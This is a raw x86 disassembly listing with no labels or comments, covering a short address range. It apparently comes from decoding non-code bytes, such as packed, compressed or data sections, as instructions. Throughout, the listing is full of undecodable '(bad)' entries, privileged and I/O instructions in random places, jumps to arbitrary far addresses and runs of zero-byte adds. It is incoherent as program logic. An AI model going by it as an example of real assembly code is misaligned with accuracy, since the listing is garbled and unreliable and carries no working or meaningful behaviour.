  42f3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3f1:	mov    es,WORD PTR [ecx-0x64f54b3d]
  42f3f7:	dec    DWORD PTR [ebx+0x1c]
  42f3fa:	dec    BYTE PTR [eax+0x758b83e1]
  42f400:	pop    eax
  42f401:	cs call 0x87ed69c9
  42f407:	cli    
  42f408:	inc    esi
  42f409:	aaa    
  42f40a:	dec    esp
  42f40b:	(bad)  
  42f40c:	imul   ebp,DWORD PTR [ecx+0x40bd86fe],0xffffff8c
  42f413:	or     bh,BYTE PTR [eax]
  42f415:	and    al,0xc7
  42f417:	push   esp
  42f418:	fstp   DWORD PTR [edx+0x653844f7]
  42f41e:	xchg   DWORD PTR cs:[ebx+0x4d4e3239],esi
  42f425:	lahf   
  42f426:	(bad)  
  42f427:	push   DWORD PTR [ebp+0x41]
  42f42a:	xor    al,0x35
  42f42c:	jne    0x42f497
  42f42e:	add    ebx,0xffffff8d
  42f431:	adc    al,0x9c
  42f433:	inc    esp
  42f434:	fidiv  WORD PTR [edi+eax*4-0x6952df06]
  42f43b:	cmp    al,0xce
  42f43d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f43e:	xchg   DWORD PTR [esi+0x44db6d30],eax
  42f444:	ins    DWORD PTR es:[edi],dx
  42f445:	push   0x9131fec3
  42f44a:	xchg   ebp,eax
  42f44b:	inc    ebx
  42f44c:	jb     0x42f3d2
  42f44e:	xchg   DWORD PTR [esi+edi*8-0x74],edx
  42f452:	jge    0x42f43f
  42f454:	add    BYTE PTR [eax],al
  42f456:	add    BYTE PTR [eax],al
  42f458:	add    BYTE PTR [ecx+0x67],bh
  42f45b:	(bad)  
  42f45c:	inc    esi
  42f45e:	adc    esi,DWORD PTR [ecx]
  42f460:	push   0xfffe6a74
  42f465:	clc    
  42f466:	in     eax,0x82
  42f468:	cld    
  42f469:	inc    edx
  42f46a:	aam    0x2e
  42f46c:	sti    
  42f46d:	shl    BYTE PTR [ecx-0x79],0x14
  42f471:	or     eax,0xfe003e5d
  42f476:	and    BYTE PTR [edx-0x2a],bh
  42f479:	mov    ds:0x66fad500,eax
  42f47e:	xor    ecx,DWORD PTR [eax-0x46fd9e4f]
  42f484:	inc    ebx
  42f485:	jne    0x42f40e
  42f487:	push   0xffffffdb
  42f489:	mov    dl,0xc2
  42f48b:	call   0xbc0e606
  42f490:	mov    bh,ch
  42f492:	shr    DWORD PTR [ebp-0x3c],1
  42f495:	shl    bl,cl
  42f497:	dec    edi
  42f498:	mov    bh,bl
  42f49a:	test   BYTE PTR [eax],ch
  42f49c:	packssdw mm7,QWORD PTR [edi+0x22]
  42f4a0:	div    DWORD PTR [edi]
  42f4a2:	jg     0x42f486
  42f4a4:	cmp    al,0x5b
  42f4a6:	pop    ecx
  42f4a7:	adc    eax,0x2ddc1fc4
  42f4ac:	mov    ebp,0x1ae905f8
  42f4b1:	scas   al,BYTE PTR es:[edi]
  42f4b2:	or     eax,0x31f77b4b
  42f4b7:	sbb    DWORD PTR [ebp+esi*2+0x67],eax
  42f4bb:	ret    
  42f4bc:	xor    DWORD PTR [eax],eax
  42f4be:	add    BYTE PTR [eax],al
  42f4c0:	add    BYTE PTR [eax],al
  42f4c2:	repnz ins DWORD PTR es:[edi],dx
  42f4c4:	addr16 cwde 
  42f4c6:	outs   dx,BYTE PTR ds:[esi]
  42f4c7:	or     ch,cl
  42f4c9:	add    esp,DWORD PTR [edi]
  42f4cb:	rcl    DWORD PTR [eax],cl
  42f4cd:	js     0x42f544
  42f4cf:	add    ch,cl
  42f4d1:	xor    cl,BYTE PTR [ebp+0x6f874da4]
  42f4d7:	jp     0x42f4b4
  42f4d9:	mov    ebx,0x7ce8c285
  42f4de:	mov    ds:0x5f8c65fe,eax
  42f4e3:	lock loope 0x42f4b7
  42f4e6:	adc    ch,BYTE PTR [ecx+ebp*4+0x1]
  42f4ea:	jne    0x42f4ee
  42f4ec:	push   ss
  42f4ed:	mov    fs,WORD PTR [edi+eax*4-0x15558055]
  42f4f4:	imul   DWORD PTR [edx+edi*8+0x7e]
  42f4f8:	push   eax
  42f4f9:	leave  
  42f4fa:	mov    eax,DWORD PTR [edx]
  42f4fc:	jmp    0xffc1ae79
  42f501:	cwde   
  42f502:	repz push cs
  42f504:	ins    BYTE PTR es:[edi],dx
  42f505:	aad    0xb6
  42f507:	add    cl,BYTE PTR [ecx-0x3dcef156]
  42f50d:	xchg   ebp,eax
  42f50e:	rcr    edi,cl
  42f510:	add    BYTE PTR [esp+esi*4+0x7e],ah
  42f514:	dec    edi
  42f515:	and    esp,0x96d879a
  42f51b:	push   ds
  42f51c:	pop    ds
  42f51d:	jmp    0x6d877c98
  42f522:	mov    eax,ds:0xe865d4
  42f527:	add    BYTE PTR [eax],al
  42f529:	add    BYTE PTR [eax],al
  42f52b:	cmp    edx,ecx
  42f52d:	fldcw  WORD PTR [edx]
  42f52f:	jno    0x42f506
  42f531:	cli    
  42f532:	hlt    
  42f533:	mov    dl,0x12
  42f535:	inc    eax
  42f536:	jmp    0x124f2d74
  42f53b:	repz cmc 
  42f53d:	lods   al,BYTE PTR ds:[esi]
  42f53e:	push   ebx
  42f53f:	jo     0x42f4c8
  42f541:	inc    esp
  42f542:	gs jmp 0x1a69:0x11d
  42f549:	call   0xfabc8a09
  42f54e:	je     0x42f585
  42f550:	jle    0x42f5a1
  42f552:	aaa    
  42f553:	push   edx
  42f554:	jge    0x42f56a
  42f556:	leave  
  42f557:	xchg   DWORD PTR [ecx],edi
  42f559:	add    BYTE PTR [eax-0x49],ah
  42f55c:	push   cs
  42f55d:	aaa    
  42f55e:	scas   eax,DWORD PTR es:[edi]
  42f55f:	jp     0x42f4e1
  42f561:	gs call 0x19c6b444
  42f567:	jns    0x42f581
  42f569:	sahf   
  42f56a:	icebp  
  42f56b:	fisub  WORD PTR [ecx-0x36]
  42f56e:	or     esi,DWORD PTR [ecx+0x2]
  42f571:	lea    esp,[edx+eax*8-0x3ffe9837]
  42f578:	dec    ecx
  42f579:	(bad)  
  42f57a:	mov    dh,0x8c
  42f57c:	(bad)  
  42f57d:	push   edx
  42f57e:	add    BYTE PTR [edx],cl
  42f580:	adc    BYTE PTR [ebx],0x8c
  42f583:	ds (bad) 
  42f587:	cmovl  eax,eax
  42f58a:	sets   BYTE PTR [ecx]
  42f58d:	idiv   edi
  42f58f:	add    BYTE PTR [eax],al
  42f591:	add    BYTE PTR [eax],al
  42f593:	add    BYTE PTR [ebx+0x27],dl
  42f596:	dec    esi
  42f597:	push   esi
  42f598:	out    0x2,al
  42f59a:	push   eax
  42f59b:	(bad)  
  42f59c:	stc    
  42f59d:	in     al,dx
  42f59e:	or     al,0x40
  42f5a0:	fmul   QWORD PTR [ebx-0x40]
  42f5a3:	addps  xmm7,XMMWORD PTR ds:0xfce3fff7
  42f5aa:	cmp    DWORD PTR [eax],edx
  42f5ac:	leave  
  42f5ad:	pop    esp
  42f5ae:	(bad)  
  42f5af:	(bad)  
  42f5b0:	fsub   QWORD PTR [esi]
  42f5b2:	mov    DWORD PTR [ebx+0x74],eax
  42f5b5:	mov    eax,0x7dccfb43
  42f5ba:	adc    ecx,DWORD PTR [eax]
  42f5bc:	mov    ecx,0x5988ffc4
  42f5c1:	xchg   edx,eax
  42f5c2:	xor    esi,eax
  42f5c4:	mov    ds:0x8c016cf8,eax
  42f5c9:	add    al,0x83
  42f5cb:	cmp    eax,0x3a6e04
  42f5d0:	ss jbe 0x42f61d
  42f5d3:	mov    DWORD PTR [edi+0x62],ebp
  42f5d6:	xchg   DWORD PTR [ebx-0x5c],esi
  42f5d9:	jge    0x42f5a8
  42f5db:	push   0xffffff96
  42f5dd:	jge    0x42f652
  42f5df:	hlt    
  42f5e0:	aad    0xc1
  42f5e2:	sub    edi,edi
  42f5e4:	or     edi,edx
  42f5e6:	inc    ecx
  42f5e7:	sub    al,0x7c
  42f5e9:	xor    esi,edi
  42f5eb:	jne    0x42f5c5
  42f5ed:	sti    
  42f5ee:	cmp    DWORD PTR [eax],esi
  42f5f0:	jecxz  0x42f659
  42f5f2:	ficom  WORD PTR [eax]
  42f5f4:	sbb    al,0x4
  42f5f6:	xor    eax,esi
  42f5f8:	add    BYTE PTR [eax],al
  42f5fa:	add    BYTE PTR [eax],al
  42f5fc:	add    BYTE PTR [eax],ch
  42f5fe:	imul   ecx,DWORD PTR [edx+0x56],0x3e71b775
  42f605:	push   ebp
  42f606:	mov    ecx,0x9a254471
  42f60b:	xor    DWORD PTR [ecx+ebp*1-0x2e],0x28
  42f610:	sbb    BYTE PTR [ebx],0x31
  42f613:	cdq    
  42f614:	std    
  42f615:	inc    edi
  42f616:	sub    DWORD PTR [ebp+0x40f30174],eax
  42f61c:	sbb    al,0xab
  42f61e:	sbb    bl,ch
  42f620:	punpcklbw mm5,DWORD PTR [ecx+0x656638fe]
  42f627:	repz add DWORD PTR [eax-0x11000196],0xffffffa6
  42f62f:	mov    fs,WORD PTR [ecx-0x12]
  42f632:	stos   BYTE PTR es:[edi],al
  42f633:	hlt    
  42f634:	popa   
  42f635:	mov    ah,0x1
  42f637:	add    DWORD PTR [eax-0x4e0adeca],ecx
  42f63d:	mov    ch,0x68
  42f63f:	push   ebx
  42f640:	ds mov edx,esp
  42f643:	aas    
  42f644:	xor    al,0xdd
  42f646:	ins    BYTE PTR es:[edi],dx
  42f647:	or     al,BYTE PTR [edx]
  42f649:	test   BYTE PTR [ecx-0x7e],0x7e
  42f64d:	mov    ch,0x5d
  42f64f:	sub    eax,0x96753689
  42f654:	inc    eax
  42f655:	int3   
  42f656:	test   al,0x83
  42f658:	jg     0x42f662
  42f65a:	jno    0x42f659
  42f65c:	sar    DWORD PTR [eax],0xa4
  42f65f:	std    
  42f660:	or     al,BYTE PTR [eax]
  42f662:	add    BYTE PTR [eax],al
  42f664:	add    BYTE PTR [eax],al
  42f666:	lock lods eax,DWORD PTR ds:[esi]
  42f668:	(bad)  
  42f669:	push   DWORD PTR [ebp-0x2a]
  42f66c:	inc    ecx
  42f66d:	jecxz  0x42f6d1
  42f66f:	add    BYTE PTR [ebx-0x17b473f],0xe7
  42f676:	dec    ebx
  42f677:	inc    ebp
  42f678:	(bad)  
  42f679:	(bad)  
  42f67a:	fistp  WORD PTR [ecx+0x16]
  42f67d:	cwde   
  42f67e:	push   edi
  42f67f:	add    ah,BYTE PTR [esi+0x1cc2f003]
  42f685:	xor    al,0x4d
  42f687:	ror    BYTE PTR [edi-0x6c7ad07c],cl
  42f68d:	ins    DWORD PTR es:[edi],dx
  42f68e:	sub    DWORD PTR [edi+0x41],esi
  42f691:	fwait
  42f692:	jo     0x42f67d
  42f694:	cmp    al,BYTE PTR [ebx+esi*8+0x75024a81]
  42f69b:	add    ah,BYTE PTR [eax+0x40]
  42f69e:	mov    ecx,0x750212b9
  42f6a3:	add    ch,BYTE PTR [esi-0x43]
  42f6a6:	xor    al,0x2
  42f6a8:	jmp    0x103032f0
  42f6ad:	sbb    ebp,ebx
  42f6af:	add    ecx,ebp
  42f6b1:	add    esi,eax
  42f6b3:	jl     0x42f730
  42f6b5:	xchg   edi,ebx
  42f6b7:	jbe    0x42f651
  42f6b9:	jbe    0x42f64e
  42f6bb:	rcr    BYTE PTR [eax-0x1e469265],cl
  42f6c1:	sbb    DWORD PTR [eax+0x1],0x6c
  42f6c5:	leave  
  42f6c6:	not    cl
  42f6c8:	inc    eax
  42f6c9:	add    BYTE PTR es:[eax],al
  42f6cc:	add    BYTE PTR [eax],al
  42f6ce:	add    ah,ah
  42f6d0:	cdq    
  42f6d1:	lock imul ebp,DWORD PTR [edx],0x21
  42f6d5:	jmp    0x64ffe6dd
  42f6da:	aam    0x4b
  42f6dc:	ja     0x42f6f7
  42f6de:	in     al,dx
  42f6df:	sub    bl,BYTE PTR [eax+0x25]
  42f6e2:	add    al,0x8e
  42f6e4:	or     al,0xc9
  42f6e6:	push   ss
  42f6e7:	xor    eax,0x1a877002
  42f6ec:	add    ecx,ebp
  42f6ee:	add    ebp,DWORD PTR [edx+0x7387d93d]
  42f6f4:	je     0x42f677
  42f6f6:	add    edi,0x75
  42f6f9:	ror    DWORD PTR [ebx],cl
  42f6fb:	add    dl,0xff
  42f6fe:	call   0x76795d06
  42f703:	dec    ebp
  42f704:	retf   
  42f705:	push   ecx
  42f706:	pop    sp
  42f708:	inc    esi
  42f709:	pop    gs
  42f70b:	jbe    0x42f698
  42f70d:	jle    0x42f6cc
  42f70f:	jns    0x42f713
  42f711:	add    BYTE PTR [edx],dl
  42f713:	mov    esi,0x79d32ff1
  42f718:	fadd   QWORD PTR [eax]
  42f71a:	xchg   edi,eax
  42f71b:	test   DWORD PTR [esi],0x7636d9e4
  42f721:	xchg   DWORD PTR [edx+0x15],ebp
  42f724:	add    eax,DWORD PTR [eax]
  42f726:	jmp    0x2b6386e
  42f72b:	and    DWORD PTR [ecx-0x52],edi
  42f72e:	mov    ebp,0xe000279
  42f733:	add    BYTE PTR [eax],al
  42f735:	add    BYTE PTR [eax],al
  42f737:	add    BYTE PTR [edx+esi*4-0x748956f1],cl
  42f73e:	jle    0x42f6e1
  42f740:	jno    0x42f744
  42f742:	add    BYTE PTR [edx+0x2703f13f],dh
  42f748:	mov    esp,0x9e3f006c
  42f74d:	js     0x42f763
  42f74f:	stc    
  42f750:	pop    ebp
  42f751:	ret    0x62ff
  42f754:	mov    ebp,0x382f5a6c
  42f759:	mov    bh,0x3
  42f75b:	jmp    0x9d5f742b
  42f760:	xchg   dl,al
  42f762:	call   FWORD PTR [esi]
  42f764:	add    ah,BYTE PTR [esi-0x7a]
  42f767:	daa    
  42f768:	push   ebp
  42f769:	rol    DWORD PTR [ecx+ebp*4-0x61b58b76],1
  42f770:	and    edi,DWORD PTR [ecx+eax*2-0x1b]
  42f774:	add    esi,DWORD PTR [esi]
  42f776:	add    al,0xfa
  42f778:	ss jne 0x42f6fe
  42f77b:	add    BYTE PTR [ebp*2-0x2724b007],cl
  42f782:	add    DWORD PTR [esi+0x60],0x40fff27c
  42f789:	or     BYTE PTR [eax-0x1],dl
  42f78c:	inc    ecx
  42f78d:	lds    ecx,FWORD PTR [edi]
  42f78f:	inc    eax
  42f790:	dec    esp
  42f791:	test   BYTE PTR [eax+0x14],al
  42f794:	mov    eax,ds:0xec036ec1
  42f799:	jg     0x42f768
  42f79b:	mov    eax,DWORD PTR [eax]
  42f79d:	add    BYTE PTR [eax],al
  42f79f:	add    BYTE PTR [eax],al
  42f7a1:	rcl    BYTE PTR [eax],cl
  42f7a3:	test   eax,eax
  42f7a5:	loopne 0x42f7ae
  42f7a7:	push   eax
  42f7a8:	push   DWORD PTR [ecx]
  42f7aa:	lea    ecx,[eax+eax*2]
  42f7ad:	sbb    al,0x84
  42f7af:	add    BYTE PTR [ebp+0x4ff96d4c],al
  42f7b5:	pop    ebx
  42f7b6:	fdivr  DWORD PTR [edx+0x7c]
  42f7b9:	rcl    BYTE PTR [eax],0x0
  42f7bc:	je     0x42f7c3
  42f7be:	test   BYTE PTR [eax+0xcd58],al
  42f7c4:	test   DWORD PTR [ebp+ebp*2-0x4634aff5],ecx
  42f7cb:	dec    esi
  42f7cc:	add    esp,ebx
  42f7ce:	add    bh,dh
  42f7d0:	adc    eax,0x400ddc
  42f7d5:	inc    edi
  42f7d6:	mov    BYTE PTR [esi+0x1],dl
  42f7d9:	pushf  
  42f7da:	add    BYTE PTR [ebp+0x4fff40c0],al
  42f7e0:	(bad)  
  42f7e1:	inc    DWORD PTR [esi+0x8d5480]
  42f7e7:	add    BYTE PTR [ebp+0x4ffd79dc],al
  42f7ed:	fisttp DWORD PTR [eax+eax*8]
  42f7f0:	adc    BYTE PTR [esi+edi*8-0x7e],cl
  42f7f4:	xchg   BYTE PTR [ecx+eax*1+0x0],ch
  42f7f8:	add    BYTE PTR [ebp-0x1a],dh
  42f7fb:	inc    ebx
  42f7fc:	jae    0x42f874
  42f7fe:	cmp    DWORD PTR [ecx-0x7c1c112e],eax
  42f804:	add    BYTE PTR [eax],al
  42f806:	add    BYTE PTR [eax],al
  42f808:	add    BYTE PTR [eax],al
  42f80a:	jne    0x42f875
  42f80c:	cmp    DWORD PTR [edi-0x13b837],0x1c12e4ba
  42f816:	test   ax,0x3cfe
  42f81a:	ja     0x42f886
  42f81c:	(bad)  
  42f81d:	jmp    FWORD PTR [ecx-0x63001389]
  42f823:	imul   ebp,esp,0x8bf4220d
  42f829:	add    BYTE PTR [ebp+0x69],dh
  42f82c:	jg     0x42f842
  42f82e:	imul   edx,DWORD PTR [ebp-0x42],0x1bf5ff
  42f835:	add    DWORD PTR [ebp+0x69],esi
  42f838:	sub    WORD PTR [ebp+0x535a8114],sp
  42f83f:	mov    al,0x44
  42f841:	add    esi,DWORD PTR [ebp-0x20]
  42f844:	(bad)  
  42f845:	nop    edx
  42f848:	add    eax,DWORD PTR [eax]
  42f84a:	jne    0x42f829
  42f84c:	inc    ebx
  42f84d:	jae    0x42f897
  42f84f:	jmp    0x69b41c53
  42f854:	ror    DWORD PTR [edx],cl
  42f856:	jmp    0xaf3cd103
  42f85b:	fs mov eax,0x86af57ef
  42f861:	sbb    edi,DWORD PTR [ebx+0x23]
  42f864:	fnstsw WORD PTR [ebx]
  42f866:	aad    0x37
  42f868:	fnstsw WORD PTR [ebx]
  42f86a:	aam    0x2b
  42f86c:	ds cmp al,0x0
  42f86f:	add    BYTE PTR [eax],al
  42f871:	add    BYTE PTR [eax],al
  42f873:	(bad)  
  42f874:	xor    esp,DWORD PTR [ecx]
  42f876:	cmp    al,0xd0
  42f878:	sub    al,0xd1
  42f87a:	and    esp,0x2
  42f87d:	dec    ebp
  42f87e:	add    esi,DWORD PTR [ebp+0x2]
  42f881:	adc    al,0x10
  42f883:	stc    
  42f884:	nop
  42f885:	dec    ebx
  42f886:	add    esi,DWORD PTR [ebp+0x2]
  42f889:	adc    al,0x8
  42f88b:	xchg   edx,eax
  42f88c:	inc    edx
  42f88d:	lea    eax,ds:0xc2703ff2
  42f893:	and    BYTE PTR [edi-0x44],0x87
  42f897:	in     eax,0x9f
  42f899:	call   0xf5306da1
  42f89e:	xchg   ebp,esp
  42f8a0:	sahf   
  42f8a1:	call   0xed306da9
  42f8a6:	xor    al,0x35
  42f8a8:	addr16 out 0x8c,al
  42f8ab:	loopne 0x42f836
  42f8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8ae:	adc    dl,BYTE PTR [edx]
  42f8b0:	sbb    DWORD PTR [ebp-0x6e],esp
  42f8b3:	repnz add ecx,ebp
  42f8b6:	add    eax,DWORD PTR [eax-0x2a6d9afa]
  42f8bc:	add    ecx,ebp
  42f8be:	add    eax,DWORD PTR [eax-0x24bc2a02]
  42f8c4:	call   FWORD PTR [ebp+0x45]
  42f8c7:	repnz sar al,0x34
  42f8cb:	mov    ch,0x7d
  42f8cd:	xchg   edi,eax
  42f8ce:	add    ah,BYTE PTR [ecx+0x1]
  42f8d1:	test   eax,0x7d002587
  42f8d6:	add    al,0x0
  42f8d8:	add    BYTE PTR [eax],al
  42f8da:	add    BYTE PTR [eax],al
  42f8dc:	dec    edx
  42f8dd:	dec    edx
  42f8de:	out    0x87,al
  42f8e0:	and    eax,0x3a035cfe
  42f8e5:	dec    edx
  42f8e6:	clc    
  42f8e7:	xchg   DWORD PTR [ebp+0x12],eax
  42f8ea:	pop    ebp
  42f8eb:	add    ebp,DWORD PTR [edx]
  42f8ed:	dec    edx
  42f8ee:	in     al,0x87
  42f8f0:	inc    ebp
  42f8f1:	adc    DWORD PTR ds:0xf04a1a03,edi
  42f8f7:	inc    ecx
  42f8f8:	jbe    0x42f8fc
  42f8fa:	add    BYTE PTR [esi+edi*8],bl
  42f8fd:	data16 jle 0x42f8c5
  42f900:	add    DWORD PTR [edx+0x271bdeb],eax
  42f906:	add    BYTE PTR [edx],bh
  42f908:	repnz push ss
  42f90a:	add    al,bh
  42f90c:	ss jb  0x42f959
  42f90f:	mov    ?,WORD PTR [esi+edx*8+0x14]
  42f913:	sub    DWORD PTR [ecx-0x79],esi
  42f916:	mov    edi,0x4b7f5df5
  42f91b:	int    0x72
  42f91d:	shl    DWORD PTR [ebp+0x5],cl
  42f920:	in     al,0xbd
  42f922:	and    esp,ecx
  42f924:	and    eax,ebp
  42f926:	std    
  42f927:	mov    eax,0xfc6816b3
  42f92c:	ss jb  0x42f8b2
  42f92f:	sub    DWORD PTR ds:0x52c57ebe,ebx
  42f935:	push   es
  42f936:	dec    edx
  42f937:	mov    ah,0x3d
  42f939:	call   0x26805d3d
  42f93e:	or     al,0x99
  42f940:	add    BYTE PTR [eax],al
  42f942:	add    BYTE PTR [eax],al
  42f944:	add    BYTE PTR [esi],cl
  42f946:	jg     0x42f990
  42f948:	fimul  WORD PTR [ecx+0x5a]
  42f94b:	es (bad) 
  42f94d:	jbe    0x42f951
  42f94f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42f951:	add    eax,0x5dd23c6
  42f956:	mov    esi,0x1b4e7d23
  42f95b:	mov    bl,0xfe
  42f95d:	push   ebx
  42f95e:	xchg   BYTE PTR [edi-0x492d6e84],bh
  42f964:	shl    DWORD PTR [edx],1
  42f966:	xor    BYTE PTR [eax],al
  42f968:	shl    edx,1
  42f96a:	js     0x42f966
  42f96c:	fdivp  st(2),st
  42f96e:	mov    cl,0x73
  42f970:	loopne 0x42f969
  42f972:	(bad)  
  42f973:	pop    ds
  42f974:	scas   eax,DWORD PTR es:[edi]
  42f975:	mov    bh,0x71
  42f977:	(bad)  
  42f978:	inc    edi
  42f97a:	(bad)  
  42f97b:	popa   
  42f97c:	add    BYTE PTR [edi],al
  42f97e:	(bad)
  42f982:	lock cmc 
  42f984:	pop    ebx
  42f985:	pop    ss
  42f986:	ficomp DWORD PTR [ebx-0x3d]
  42f989:	pop    es
  42f98a:	dec    ecx
  42f98b:	push   ds
  42f98c:	add    al,0x1b
  42f98e:	add    edx,DWORD PTR [esi+ecx*4]
  42f991:	pushf  
  42f992:	push   es
  42f993:	adc    DWORD PTR [ecx+0x20],0x1c
  42f997:	push   ecx
  42f998:	and    al,0xe5
  42f99a:	adc    eax,0x1c0c5183
  42f99f:	push   ecx
  42f9a0:	sub    ch,dl
  42f9a2:	push   ebp
  42f9a3:	dec    BYTE PTR [edx-0xa633]
  42f9a9:	add    BYTE PTR [eax],al
  42f9ab:	add    BYTE PTR [eax],al
  42f9ad:	add    BYTE PTR [ebx+eax*8-0x2],cl
  42f9b1:	(bad)  
  42f9b2:	jmp    0xb0c6e032
  42f9b7:	dec    ebp
  42f9b8:	add    ecx,0x6aa652c1
  42f9be:	cmp    al,0x7e
  42f9c0:	dec    ebx
  42f9c1:	cld    
  42f9c2:	mov    eax,ds:0x91521e55
  42f9c7:	push   edx
  42f9c8:	out    0x51,al
  42f9ca:	xchg   ebp,eax
  42f9cb:	cmp    ah,dl
  42f9cd:	call   0x38b0ed
  42f9d2:	push   es
  42f9d3:	add    ecx,DWORD PTR [edx-0x1]
  42f9d6:	dec    esp
  42f9d7:	pop    ecx
  42f9d8:	(bad)  
  42f9d9:	dec    esp
  42f9db:	out    dx,eax
  42f9dc:	adc    ebp,DWORD PTR [eax+edi*4]
  42f9df:	inc    esp
  42f9e0:	cli    
  42f9e1:	imul   ebx,esp,0xa8fc13ef
  42f9e7:	inc    esp
  42f9e8:	cli    
  42f9e9:	test   BYTE PTR [ecx+edi*2+0x49415004],cl
  42f9f0:	loop   0x42fa42
  42f9f2:	(bad)  
  42f9f3:	lock (bad) 
  42f9f6:	jne    0x42fa50
  42f9f8:	inc    esi
  42f9f9:	mov    esi,0xf089384b
  42f9fe:	out    dx,al
  42f9ff:	and    BYTE PTR [ebx+edi*8],dl
  42fa02:	lds    esp,FWORD PTR [esi-0x3]
  42fa05:	push   DWORD PTR [ebp-0x1c]
  42fa08:	mov    edi,edi
  42fa0a:	jne    0x42fa67
  42fa0c:	(bad)  
  42fa0d:	push   eax
  42fa0e:	ud0    ecx,DWORD PTR [eax+0xf5]
  42fa15:	add    BYTE PTR [eax],al
  42fa17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa18:	stos   DWORD PTR es:[edi],eax
  42fa19:	(bad)  
  42fa1a:	out    0x7f,eax
  42fa1c:	jp     0x42fa97
  42fa1e:	cli    
  42fa1f:	clc    
  42fa20:	cdq    
  42fa21:	test   DWORD PTR [ebx],0xc226e5a
  42fa27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa28:	hlt    
  42fa29:	inc    esp
  42fa2a:	out    0x2,eax
  42fa2c:	ins    BYTE PTR es:[edi],dx
  42fa2d:	jnp    0x42fa29
  42fa2f:	mov    ds:0x75033dff,al
  42fa34:	call   0xf4c41e30
  42fa39:	ds cli 
  42fa3b:	mov    eax,ds:0xa9fb0ffd
  42fa40:	add    eax,0x610d4e10
  42fa45:	sar    edx,1
  42fa47:	adc    bl,BYTE PTR [eax+edx*1]
  42fa4a:	add    BYTE PTR [edi],dh
  42fa4c:	pop    esi
  42fa4d:	(bad)  
  42fa4e:	push   esp
  42fa4f:	out    dx,al
  42fa50:	sub    eax,0xf4fde381
  42fa55:	ret    0xf60b
  42fa58:	std    
  42fa59:	pop    ds
  42fa5a:	dec    edi
  42fa5b:	inc    ebx
  42fa5c:	mov    al,0x7f
  42fa5e:	mul    eax
  42fa60:	push   eax
  42fa61:	sub    BYTE PTR [esi+0x74],0x59
  42fa65:	dec    BYTE PTR [edx]
  42fa67:	sti    
  42fa68:	lods   eax,DWORD PTR ds:[esi]
  42fa69:	std    
  42fa6a:	push   DWORD PTR [ebp-0x24]
  42fa6d:	jnp    0x42fa69
  42fa6f:	jb     0x42fa59
  42fa71:	xor    BYTE PTR [ecx],al
  42fa73:	jne    0x42fa77
  42fa75:	jmp    0xda3d23f6
  42fa7a:	push   ss
  42fa7b:	add    BYTE PTR [eax],al
  42fa7d:	add    BYTE PTR [eax],al
  42fa7f:	add    ch,dh
  42fa81:	push   ss
  42fa82:	sub    DWORD PTR [edx+edi*8],eax
  42fa85:	push   0x63
  42fa87:	jl     0x42faf8
  42fa89:	xchg   BYTE PTR [ebx],ah
  42fa8b:	add    esi,DWORD PTR [ebp+0x2]
  42fa8e:	iretw  
  42fa90:	push   esi
  42fa91:	push   ss
  42fa92:	mov    dl,0xd4
  42fa94:	jg     0x42faab
  42fa96:	mov    DWORD PTR [edi],edx
  42fa98:	xor    eax,0xfd58d602
  42fa9d:	(bad)
  42faa0:	das    
  42faa1:	add    ch,ch
  42faa3:	add    esi,DWORD PTR [ebp-0x7b]
  42faa6:	test   al,0xfd
  42faa8:	xchg   esi,eax
  42faa9:	fcom   DWORD PTR ds:0x5d154fd5
  42faaf:	pop    ss
  42fab0:	mov    ch,0x2
  42fab2:	ins    DWORD PTR es:[edi],dx
  42fab3:	inc    ebx
  42fab4:	mov    ebp,0xa7d11312
  42fab9:	outs   dx,DWORD PTR ds:[esi]
  42faba:	fisttp DWORD PTR [ebx]
  42fabc:	cs adc eax,0x2b51785
  42fac2:	pusha  
  42fac3:	fist   WORD PTR [esi+0x16]
  42fac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fac7:	cmp    BYTE PTR [ecx+0x2effd926],bh
  42facd:	mov    eax,ds:0x24b6010
  42fad2:	xor    dh,BYTE PTR [ebx+0x3e90176]
  42fad8:	(bad)  
  42fad9:	mov    cl,0xe8
  42fadb:	add    dh,BYTE PTR [ebp+0x2]
  42fade:	mov    dl,0x7c
  42fae0:	popa   
  42fae1:	cli    
  42fae2:	adc    DWORD PTR [esi],edx
  42fae4:	add    BYTE PTR [eax],al
  42fae6:	add    BYTE PTR [eax],al
  42fae8:	add    BYTE PTR [ecx+0x16],ah
  42faeb:	test   eax,0x6549f203
  42faf0:	js     0x42fac1
  42faf2:	(bad)  
  42faf3:	fs jnp 0x42fac0
  42faf6:	outs   dx,BYTE PTR ds:[esi]
  42faf7:	(bad)  
  42faf8:	call   0xee95baa5
  42fafd:	pusha  
  42fafe:	mov    ss,WORD PTR [ebx]
  42fb00:	sub    DWORD PTR [ecx+0x79],edi
  42fb03:	inc    ebx
  42fb04:	add    eax,0xd5c2981
  42fb09:	test   esi,esi
  42fb0b:	add    esi,ecx
  42fb0d:	test   BYTE PTR [edx],ah
  42fb0f:	adc    eax,0x7fda7929
  42fb14:	in     eax,0x76
  42fb16:	add    cl,BYTE PTR [edi+0x1e]
  42fb19:	(bad)  
  42fb1a:	cmc    
  42fb1b:	pop    es
  42fb1c:	scas   al,BYTE PTR es:[edi]
  42fb1d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42fb1f:	adc    ebp,DWORD PTR [ecx]
  42fb21:	jns    0x42fb10
  42fb23:	jl     0x42fb12
  42fb25:	in     al,dx
  42fb26:	clc    
  42fb27:	sub    DWORD PTR [ecx+edi*2+0x35970002],0x22
  42fb2f:	adc    dl,ch
  42fb31:	jg     0x42faba
  42fb33:	mov    ch,0xe9
  42fb35:	jbe    0x42fb39
  42fb37:	repnz sub eax,0xf5101295
  42fb3d:	xor    eax,0x846652bd
  42fb42:	jmp    0x6cef:0x8576a913
  42fb49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb4a:	clc    
  42fb4b:	or     DWORD PTR [eax+0x0],0x0
  42fb52:	jno    0x42fb56
  42fb54:	add    BYTE PTR [ebp+esi*1+0x22],dh
  42fb58:	sbb    BYTE PTR [ecx-0x43052edd],bl
  42fb5e:	outs   dx,BYTE PTR ds:[esi]
  42fb5f:	imul   edx,DWORD PTR [eiz*2+0x6bffc265],0x7083f839
  42fb6a:	jno    0x42fb6e
